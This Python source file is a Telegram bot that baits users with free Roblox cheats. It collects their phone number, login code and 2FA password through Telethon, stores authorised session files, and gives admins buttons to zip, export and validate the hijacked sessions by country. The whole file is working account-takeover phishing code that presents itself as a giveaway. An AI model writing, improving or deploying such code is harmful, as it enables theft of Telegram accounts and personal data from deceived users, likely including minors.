import os
import zipfile
import asyncio
import logging
import tempfile


import phonenumbers
from phonenumbers import geocoder
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command
from aiogram.types import (
    InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery,
    ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove, Message,
    FSInputFile
)

from telethon import TelegramClient
from telethon.errors.rpcerrorlist import PhoneCodeInvalidError
from telethon.errors import SessionPasswordNeededError, PhoneNumberInvalidError, FloodWaitError, AuthKeyUnregisteredError

import config
from config import ADMIN_ID

# ===================== БАЗОВАЯ НАСТРОЙКА =====================

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)

bot = Bot(token=config.BOT_TOKEN)
dp = Dispatcher()

SESSIONS_DIR = 'sessions'
os.makedirs(SESSIONS_DIR, exist_ok=True)

# Память процесса (не пишем во внешние файлы)
user_states = {}       # user_id -> {"phone": str, "step": "code_input"|"password_input"|None}
user_clients = {}      # user_id -> TelegramClient
user_code_inputs = {}  # user_id -> "12345"
exported_sessions_count = 0  # сколько сессий уже выгружали ранее

# ===================== ВСПОМОГАТЕЛЬНОЕ =====================

def get_country_info(phone):
    """
    Возвращает кортеж (название страны, emoji-флаг) для номера телефона.
    """
    try:
        parsed = phonenumbers.parse(phone, None)
        country_name = geocoder.description_for_number(parsed, "ru") or "Неизвестно"
        country_code = parsed.country_code
        # Генерация emoji флага по ISO коду
        from phonenumbers import region_code_for_country_code
        iso_country = region_code_for_country_code(country_code)
        if iso_country:
            flag = "".join(chr(ord(c) + 127397) for c in iso_country)
        else:
            flag = ""
        return country_name, flag
    except:
        return "Неизвестно", ""
    
def get_session_path(user_id: int) -> str:
    # Телетон нормально принимает имя, уже оканчивающееся на .session (не добавит второй раз)
    return os.path.join(SESSIONS_DIR, f'{user_id}.session')

def count_sessions() -> int:
    return len([f for f in os.listdir(SESSIONS_DIR) if f.endswith('.session')])

def get_sessions_list():
    files = [f for f in os.listdir(SESSIONS_DIR) if f.endswith('.session')]
    # Упорядочим по времени изменения (сначала старые, внизу новые)
    files.sort(key=lambda fn: os.path.getmtime(os.path.join(SESSIONS_DIR, fn)))
    return files

def get_user_stats():
    total_sessions = count_sessions()
    total_users = len(user_states)

    no_phone = sum(1 for s in user_states.values() if not s.get("step"))
    code_input = sum(1 for s in user_states.values() if s.get("step") == "code_input")
    password_input = sum(1 for s in user_states.values() if s.get("step") == "password_input")

    global exported_sessions_count
    new_sessions = total_sessions - exported_sessions_count if total_sessions > exported_sessions_count else 0

    return {
        "total_sessions": total_sessions,
        "total_users": total_users,
        "no_phone": no_phone,
        "code_input": code_input,
        "password_input": password_input,
        "exported_sessions": exported_sessions_count,
        "new_sessions": new_sessions,
    }

def admin_sessions_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔄 Обновить", callback_data="admin_refresh_sessions")],
        [InlineKeyboardButton(text="📥 Скачать новые", callback_data="admin_download_sessions")],
        [InlineKeyboardButton(text="🛠 Чекер сессий", callback_data="admin_checker")],
        [InlineKeyboardButton(text="❌ Закрыть", callback_data="admin_close")]
    ])

def build_admin_text():
    stats = get_user_stats()
    text = (
        f"👥 Пользователей в памяти: {stats['total_users']}\n"
        f"📂 Всего сессий: {stats['total_sessions']}\n"
        f"✅ Выгружено сессий: {stats['exported_sessions']}\n"
        f"🆕 Новых сессий: {stats['new_sessions']}\n"
        f"⏳ Ввод номера/нет шага: {stats['no_phone']}\n"
        f"🔢 Ввод кода: {stats['code_input']}\n"
        f"🔐 Ввод пароля 2FA: {stats['password_input']}\n\n"
        "Сессии (снизу самые новые):"
    )
    sessions = get_sessions_list()
    text += "\n" + ("\n".join(sessions) if sessions else "Пока нет сессий.")
    return text

def checker_menu_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📥 Скачать рабочие", callback_data="admin_download_working")],
        [InlineKeyboardButton(text="⬅️ Назад в меню", callback_data="admin_panel")]
    ])

# ===================== ХЭНДЛЕРЫ АДМИНКИ =====================

@dp.callback_query(F.data == "admin_panel")
async def admin_panel_callback(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_ID:
        await callback.answer("Доступ запрещён.", show_alert=True)
        return
    await callback.message.edit_text(build_admin_text(), reply_markup=admin_sessions_keyboard())
    await callback.answer()

@dp.callback_query(F.data == "admin_refresh_sessions")
async def admin_refresh_sessions(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_ID:
        await callback.answer("Доступ запрещён.", show_alert=True)
        return

    text = build_admin_text()
    if callback.message.text == text:
        await callback.answer("Новых данных нет")
        return

    await callback.message.edit_text(text, reply_markup=admin_sessions_keyboard())
    await callback.answer("Обновлено.")

@dp.callback_query(F.data == "admin_download_sessions")
async def admin_download_sessions(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_ID:
        await callback.answer("Доступ запрещён.", show_alert=True)
        return

    global exported_sessions_count
    tmp_path = None

    try:
        # Список (имя, mtime), отсортированный по времени
        files = [
            (fname, os.path.getmtime(os.path.join(SESSIONS_DIR, fname)))
            for fname in os.listdir(SESSIONS_DIR) if fname.endswith(".session")
        ]
        files.sort(key=lambda x: x[1])  # старые -> новые
        total_sessions = len(files)
        new_sessions_count = max(0, total_sessions - exported_sessions_count)

        if new_sessions_count <= 0:
            await callback.answer("Новых сессий для выгрузки нет.", show_alert=True)
            return

        # Берём последние N по mtime (наиболее корректно для "новых")
        sessions_to_export = [name for name, _ in files[-new_sessions_count:]]

        with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as tmp:
            tmp_path = tmp.name
            with zipfile.ZipFile(tmp_path, 'w', zipfile.ZIP_DEFLATED) as archive:
                for filename in sessions_to_export:
                    archive.write(os.path.join(SESSIONS_DIR, filename), arcname=filename)
            tmp.flush()

        await callback.message.answer_document(
            document=FSInputFile(path=tmp_path, filename="new_sessions_archive.zip"),
            caption=f"Выгружено новых сессий: {new_sessions_count}"
        )
        await callback.answer(f"Отправлено {new_sessions_count} новых сессий.")

        # Обновляем счётчик "сколько уже выгружено всего"
        exported_sessions_count = total_sessions

    except Exception as e:
        logging.exception("Ошибка при создании/отправке архива: %s", e)
        await callback.answer(f"Ошибка при отправке архива: {e}", show_alert=True)
    finally:
        if tmp_path and os.path.exists(tmp_path):
            try:
                os.remove(tmp_path)
            except Exception as e:
                logging.error("Ошибка при удалении временного файла %s: %s", tmp_path, e)

@dp.callback_query(F.data == "admin_close")
async def admin_close(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_ID:
        await callback.answer("Доступ запрещён.", show_alert=True)
        return
    try:
        await callback.message.delete()
    finally:
        await callback.answer()

@dp.callback_query(F.data == "admin_checker")
async def admin_checker(callback: CallbackQuery):
    global working_sessions, bad_sessions, geo_stats
    if callback.from_user.id not in ADMIN_ID:
        await callback.answer("Доступ запрещён.", show_alert=True)
        return

    working_sessions = []
    bad_sessions = []
    geo_stats = {}

    all_sessions = [f for f in os.listdir(SESSIONS_DIR) if f.endswith(".session")]

    for sess in all_sessions:
        path = os.path.join(SESSIONS_DIR, sess)
        try:
            client = TelegramClient(path, config.API_ID, config.API_HASH)
            await client.connect()
            
            if not await client.is_user_authorized():
                bad_sessions.append(sess)
                await client.disconnect()
                continue

            me = await client.get_me()
            phone = me.phone
            if phone:
                country, flag = get_country_info("+" + phone.lstrip("+"))
                if country not in geo_stats:
                    geo_stats[country] = {"flag": flag, "count": 0}
                geo_stats[country]["count"] += 1

            working_sessions.append(sess)
            await client.disconnect()

        except AuthKeyUnregisteredError:
            bad_sessions.append(sess)
        except Exception as e:
            logging.error(f"Ошибка при проверке {sess}: {e}")
            bad_sessions.append(sess)

    # Формируем текст отчёта
    report_lines = [
        f"📊 Результаты проверки сессий",
        f"📂 Всего: {len(all_sessions)}",
        f"✅ Рабочие: {len(working_sessions)}",
        f"❌ Нерабочие: {len(bad_sessions)}",
        "",
        "🌍 Гео рабочих:"
    ]

    for country, info in geo_stats.items():
        report_lines.append(f"{info['flag']} {country}: {info['count']}")

    text = "\n".join(report_lines)

    await callback.message.edit_text(text, reply_markup=checker_menu_keyboard())
    await callback.answer()


@dp.callback_query(F.data == "admin_download_working")
async def download_working(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_ID:
        await callback.answer("Доступ запрещён.", show_alert=True)
        return

    if not working_sessions:
        await callback.answer("Нет рабочих сессий", show_alert=True)
        return

    with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as tmp:
        with zipfile.ZipFile(tmp.name, 'w') as archive:
            for sess in working_sessions:
                archive.write(os.path.join(SESSIONS_DIR, sess), arcname=sess)
        tmp.flush()

    await callback.message.answer_document(
        document=FSInputFile(tmp.name, filename="working_sessions.zip"),
        caption=f"✅ Рабочих сессий: {len(working_sessions)}"
    )
    os.remove(tmp.name)
    await callback.answer()

@dp.callback_query(F.data == "admin_delete_bad")
async def delete_bad(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_ID:
        await callback.answer("Доступ запрещён.", show_alert=True)
        return

    count = 0
    for sess in bad_sessions:
        try:
            os.remove(os.path.join(SESSIONS_DIR, sess))
            count += 1
        except:
            pass

    await callback.answer(f"Удалено {count} нерабочих сессий.", show_alert=True)

# ===================== ОСНОВНОЙ ФЛОУ ПОЛЬЗОВАТЕЛЯ =====================

def code_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="1", callback_data="code_1"), InlineKeyboardButton(text="2", callback_data="code_2"), InlineKeyboardButton(text="3", callback_data="code_3")],
        [InlineKeyboardButton(text="4", callback_data="code_4"), InlineKeyboardButton(text="5", callback_data="code_5"), InlineKeyboardButton(text="6", callback_data="code_6")],
        [InlineKeyboardButton(text="7", callback_data="code_7"), InlineKeyboardButton(text="8", callback_data="code_8"), InlineKeyboardButton(text="9", callback_data="code_9")],
        [InlineKeyboardButton(text="0", callback_data="code_0"), InlineKeyboardButton(text="← Назад", callback_data="code_back")]
    ])

@dp.message(Command("start"))
async def cmd_start(message: Message):
    logging.info(f"/start от пользователя {message.from_user.id}")
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📱 Нажми Сюда", callback_data="send_phone")]
    ])
    if message.from_user.id in ADMIN_ID:
        kb.inline_keyboard.append([InlineKeyboardButton(text="❗ Админ панель", callback_data="admin_panel")])
    await message.answer("Привет! Для получения читов и скрипов на Roblox нажмите на кнопку ниже ⬇️", reply_markup=kb)

@dp.callback_query(F.data == "send_phone")
async def request_phone(callback: CallbackQuery):
    logging.info(f"Пользователь {callback.from_user.id} запросил отправку номера")
    kb = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="НАЖМИ СЮДА", request_contact=True)]],
        resize_keyboard=True,
        one_time_keyboard=True
    )
    try:
        await callback.message.answer("Нажми кнопку ниже  ⬇️", reply_markup=kb)
        await callback.answer()
    except Exception as e:
        logging.error(f"Ошибка при запросе номера: {e}")
        await callback.answer("Произошла ошибка при запросе номера.", show_alert=True)

@dp.message(F.contact)
async def handle_contact(message: Message):
    try:
        user_id = message.from_user.id
        raw_phone = message.contact.phone_number
        phone = '+' + ''.join(filter(str.isdigit, raw_phone))

        await message.answer("Номер получен ✅", reply_markup=ReplyKeyboardRemove())

        session_path = get_session_path(user_id)
        if os.path.exists(session_path):
            await message.answer("У тебя уже есть сессия.")
            logging.info(f"Пользователь {user_id} попытался создать уже существующую сессию")
            return

        client = TelegramClient(session_path, config.API_ID, config.API_HASH)
        await client.connect()

        try:
            await client.send_code_request(phone)
            user_clients[user_id] = client
            user_states[user_id] = {"phone": phone, "step": "code_input"}
            user_code_inputs[user_id] = ""
            await message.answer("Код отправлен.Для получения чита введи код который отправил вам телеграм через кнопки:", reply_markup=code_keyboard())
            logging.info(f"Код отправлен пользователю {user_id}")
        except PhoneNumberInvalidError:
            await message.answer("Неверный номер телефона.")
            logging.warning(f"Неверный номер телефона у пользователя {user_id}: {phone}")
            await client.disconnect()
        except FloodWaitError as flood_err:
            await message.answer(f"Слишком много запросов, попробуй через {flood_err.seconds} секунд.")
            logging.warning(f"FloodWaitError для пользователя {user_id}: {flood_err.seconds} секунд")
            await client.disconnect()
        except Exception as e:
            await message.answer(f"Ошибка при отправке кода: {e}")
            logging.error(f"Ошибка при отправке кода пользователю {user_id}: {e}")
            await client.disconnect()
    except Exception as outer_e:
        logging.error(f"Ошибка в обработке контакта: {outer_e}")
        await message.answer(f"Произошла ошибка: {outer_e}")

@dp.callback_query(F.data.startswith("code_"))
async def process_code_digit(callback: CallbackQuery):
    user_id = callback.from_user.id
    data = callback.data

    if user_states.get(user_id, {}).get("step") != "code_input":
        await callback.answer("Нет активного запроса кода.", show_alert=True)
        return

    current_code = user_code_inputs.get(user_id, "")

    if data == "code_back":
        current_code = current_code[:-1]
    else:
        digit = data.split("_")[1]
        if len(current_code) < 5:  # код из 5 цифр
            current_code += digit

    user_code_inputs[user_id] = current_code

    try:
        await callback.message.edit_text(
            f"Код: {current_code}\n"
            f"Введено {len(current_code)} из 5",
            reply_markup=code_keyboard()
        )
    except Exception as e:
        logging.error(f"Ошибка при обновлении сообщения с кодом: {e}")

    if len(current_code) == 5:
        await callback.answer("Пытаюсь войти...")
        await try_sign_in_with_code(user_id, current_code, callback.message)
    else:
        await callback.answer()

async def try_sign_in_with_code(user_id: int, code: str, message: Message):
    client = user_clients.get(user_id)
    phone = user_states.get(user_id, {}).get("phone")
    if not client or not phone:
        await message.answer("Сессия не найдена, начните заново /start.")
        return

    try:
        await client.sign_in(phone, code)
        await on_login_success(user_id, message)
    except PhoneCodeInvalidError:
        await message.answer("Неверный код. Попробуйте ещё раз.")
        user_code_inputs[user_id] = ""
        user_states[user_id]["step"] = "code_input"
    except SessionPasswordNeededError:
        user_states[user_id]["step"] = "password_input"
        await message.answer("Требуется пароль 2FA. Введите пароль в следующем сообщении:")
    except Exception as e:
        logging.error(f"Ошибка при входе пользователя {user_id}: {e}")
        await message.answer(f"Ошибка при входе: {e}")

@dp.message(F.text)
async def handle_possible_password(message: Message):
    """
    Принимаем текст, если пользователь на шаге password_input,
    и пытаемся выполнить вход с паролем.
    Остальные текстовые сообщения игнорируем.
    """
    user_id = message.from_user.id
    if user_states.get(user_id, {}).get("step") != "password_input":
        return

    client = user_clients.get(user_id)
    if not client:
        await message.answer("Сессия не найдена, начните заново /start.")
        user_states[user_id] = {"step": None}
        return

    password = message.text.strip()
    try:
        await client.sign_in(password=password)
        await on_login_success(user_id, message)
    except Exception as e:
        logging.error(f"Ошибка при вводе 2FA пароля у {user_id}: {e}")
        await message.answer(f"Неверный пароль или ошибка входа: {e}\nПопробуйте ещё раз или /start для сброса.")

async def on_login_success(user_id: int, message: Message):
    """
    Общая логика после успешного входа (после кода или 2FA).
    """
    client = user_clients.get(user_id)
    if client:
        # Обычно Telethon сам сохраняет файл сессии, когда вы используете файловую сессию.
        # Но на всякий случай корректно завершим соединение.
        await client.disconnect()

    await message.answer("Успешный вход! Подождите не много ✅")

    # Сбросим состояние пользователя в памяти процесса
    user_states[user_id] = {"step": None}
    user_code_inputs.pop(user_id, None)
    user_clients.pop(user_id, None)
    logging.info(f"Пользователь {user_id} успешно вошёл, сессия сохранена.")

# ===================== ЗАПУСК =====================

async def main():
    # aiogram v3
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
